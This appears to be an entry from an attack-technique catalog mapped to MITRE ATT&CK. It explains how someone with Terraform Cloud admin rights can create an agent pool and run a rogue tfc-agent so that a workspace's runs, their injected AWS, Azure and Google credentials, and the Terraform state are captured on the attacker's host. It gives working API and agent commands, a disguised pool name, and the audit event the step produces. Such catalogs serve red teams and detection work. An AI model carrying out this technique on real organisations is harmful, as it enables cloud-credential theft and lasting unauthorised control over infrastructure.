---
id: tfc-agent-hijack
title: Rogue Terraform Cloud agent (capture runs + cloud creds)
section: Terraform Cloud / IaC
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1543]
platform: [terraform]
source: Terraform Cloud IaC abuse (rogue agent pool)
pair: tfc-agent-audit
---

With org/workspace-admin, create an agent pool, mint its agent token, and run your own
`tfc-agent` on infrastructure you control; then point a workspace's execution mode at
that pool. Every plan/apply now runs on your host — you read the config, the run's
injected cloud credentials (`AWS_*`, `ARM_*`, `GOOGLE_*`), and the Terraform state
(which holds resource secrets). Durable, non-interactive, and survives the admin's
password reset. Creating the pool writes a `resource.type=agent_pool`
`resource.action=create` audit event. (IaC control plane — no on-host target, no slots.)

```sh
# create an agent pool, then run an attacker-controlled agent that captures its runs
curl -s -H "Authorization: Bearer <token>" -H "Content-Type: application/vnd.api+json" \
  -d '{"data":{"type":"agent-pools","attributes":{"name":"ci-cache"}}}' \
  "https://app.terraform.io/api/v2/organizations/<org>/agent-pools"
tfc-agent -token <agent-token>   # runs targeting this pool now execute here
```
